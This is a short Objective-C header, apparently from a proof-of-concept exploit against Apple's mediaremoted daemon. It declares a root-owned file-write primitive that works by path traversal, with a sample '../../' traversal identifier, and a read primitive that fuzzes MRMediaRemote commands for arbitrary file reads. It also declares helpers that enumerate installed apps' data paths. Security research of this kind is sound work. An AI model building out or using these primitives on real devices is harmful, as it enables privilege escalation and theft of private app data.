#import <Foundation/Foundation.h>

// Write primitive: triggers root-owned file write via path traversal in mediaremoted.
// identifier: e.g. "../../../../../../../private/tmp/poc_123"
// targetPath: e.g. "/private/tmp/poc_123"
// Returns 0 on success (file appeared with uid=0), 1 on failure.
int dd_write(const char *identifier, const char *targetPath);

// Read primitive: fuzzes MRMediaRemote commands 100-200 concurrently,
// sending only field 2 (identifier/path traversal), looking for any command
// that causes the daemon to read from that path and return data.
// outBuf: caller-allocated buffer receiving raw bytes
// bufSize: size of outBuf
// outLen: set to actual bytes returned (may be NULL)
// foundCmd: set to the command number that responded (may be NULL)
// Returns 0 on success (some command returned data), -1 if none responded.
int dd_fuzz_read(const char *identifier, char *outBuf, size_t bufSize,
                 size_t *outLen, int *foundCmd);

// Returns installed apps sorted by display name.
// Each element is a dict with keys: "name", "bundleId", "dataPath", "bundlePath".
NSArray<NSDictionary<NSString *, NSString *> *> *dd_installed_apps(void);

// Returns a multi-line diagnostic string for debugging the app list.
NSString *dd_debug_info(void);
